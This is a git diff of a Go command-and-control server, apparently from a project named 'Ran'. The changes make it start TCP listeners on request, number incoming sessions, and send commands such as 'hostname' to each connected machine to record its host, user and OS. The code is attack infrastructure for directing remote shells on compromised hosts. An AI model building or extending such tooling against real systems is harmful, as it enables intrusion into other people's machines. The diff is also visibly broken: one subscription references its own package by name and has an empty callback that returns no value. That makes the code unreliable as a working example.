@@ -10,46 +10,65 @@ import (
 	"strings"
 	"sync"
 
+	"github.com/Magier/Ran/domain"
 	bus "github.com/Magier/Ran/internal"
 )
 
 type C2Started struct {
 }
 
-func (c C2Started) EventName() string {
+func (c C2Started) MessageName() string {
 	return "c2 started"
 }
 
-type SessionStarted struct {
+type Session struct {
+	Id       string
 	Hostname string
 	Os       string
 	User     string
 }
 
-func (c SessionStarted) EventName() string {
-	return fmt.Sprintf("session started: [%s] %s@%s\n", c.Hostname, c.User, c.Os)
+type SessionStarted struct {
+	Session Session
+}
+
+func (c SessionStarted) MessageName() string {
+	s := c.Session
+	return fmt.Sprintf("session started: %s@%s [%s]", s.Hostname, s.User, s.Os)
 }
 
 func StartC2(ctx context.Context, mb bus.MessageBus) {
+	// listeners := make(map[string]net.Listener)
+
 	var wg sync.WaitGroup
-	wg.Add(1)
-	port := 1337
-	go func() {
-		startListener(ctx, mb, port)
-		wg.Done()
-	}()
+	mb.Subscribe(domain.StartListener{}, func(ctx context.Context, event domain.Event) error {
+		cmd := event.(domain.StartListener)
+		wg.Add(1)
+		go func() {
+			_ = startListener(ctx, mb, cmd.Port)
+			// TODO handle disconnecting listener
+			wg.Done()
+		}()
+		// return startListener(ctx, mb, cmd.Port)
+		return nil
+	})
+
+	mb.Subscribe(c2.SessionStarted{}, func(ctx context.Context, event domain.Event) error {
+	})
+
 	err := mb.Publish(C2Started{})
 	if err != nil {
-		panic(err)
+		// panic(err)
+		slog.Error("C2", "can't publish c2 started event:", err.Error())
 	}
-	wg.Wait()
+	// wg.Wait()
 }
 
-func startListener(ctx context.Context, bus bus.MessageBus, port int) {
+func startListener(ctx context.Context, bus bus.MessageBus, port int) error {
 	listener, err := net.Listen("tcp", ":"+strconv.Itoa(port))
 	if err != nil {
 		fmt.Println("Unable to bin to port:", err)
-		return
+		return err
 	}
 	defer listener.Close()
 
@@ -58,11 +77,13 @@ func startListener(ctx context.Context, bus bus.MessageBus, port int) {
 		fmt.Println("Error publishing listener event:", err)
 	}
 
+	numSessions := 0
+
 	for {
 		select {
 		case <-ctx.Done():
 			slog.InfoContext(ctx, "Shutting down listener")
-			return
+			return nil
 		default:
 			// Accept incoming connections
 			conn, err := listener.Accept()
@@ -70,12 +91,13 @@ func startListener(ctx context.Context, bus bus.MessageBus, port int) {
 				fmt.Println("Error:", err)
 				continue
 			}
+			numSessions++
 
 			// bus.Publish()
 			// Handle client connection in a goroutine
 			in := make(chan string, 5)
 			out := make(chan string, 5)
-			go handleSession(ctx, bus, conn, in, out)
+			go handleSession(ctx, bus, conn, strconv.Itoa(numSessions), in, out)
 		}
 	}
 }
@@ -101,9 +123,9 @@ func sendCommand(conn net.Conn, cmd string) (string, error) {
 	return strings.Trim(s, "\n"), nil
 }
 
-func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, cmds <-chan string, results chan<- string) {
+func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, id string, cmds <-chan string, results chan<- string) {
 	defer conn.Close()
-	fmt.Println("Handling session")
+	slog.Debug("C2", "", "Handling session")
 
 	hostname, err := sendCommand(conn, "hostname")
 	if err != nil {
@@ -118,11 +140,15 @@ func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, cmds 
 		fmt.Println("Error reading from connection:", err)
 	}
 	// results <- os
-	bus.Publish(SessionStarted{
+	err = bus.Publish(SessionStarted{Session: Session{
+		Id:       id,
 		Hostname: hostname,
 		Os:       os,
 		User:     user,
-	})
+	}})
+	if err != nil {
+		slog.Error("Error publishing session started event:", err.Error(), "")
+	}
 
 	for {
 		select {
